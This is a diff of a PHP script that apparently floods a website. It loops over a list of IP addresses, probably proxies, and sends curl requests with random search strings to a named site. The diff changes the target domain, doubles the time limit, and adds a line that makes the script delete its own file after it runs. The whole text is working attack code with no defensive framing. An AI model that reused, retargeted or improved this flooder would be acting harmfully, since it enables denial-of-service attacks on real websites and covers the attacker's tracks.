@@ -1,5 +1,5 @@
 <?php
-@set_time_limit(30);
+@set_time_limit(60);
 function generateRandomString($length=10) {
     $original_string = array_merge(range(0,9), range('a','z'), range('A', 'Z'));
     $original_string = implode("", $original_string);
@@ -41,7 +41,7 @@ foreach($ips as $ip)
 for($i=0;$i<=count($ip)-1;$i++)
 {
 $rand = generateRandomString(20);
-$url = "https://www.fullfilmizlesin.com/?s=$rand";
+$url = "http://www.ydr9.com/?s=$rand";
       $curl[$i] = curl_init();
       curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
       curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,false);
@@ -64,4 +64,5 @@ $url = "https://www.fullfilmizlesin.com/?s=$rand";
 
 }
 }
+unlink(__FILE__);
 ?>
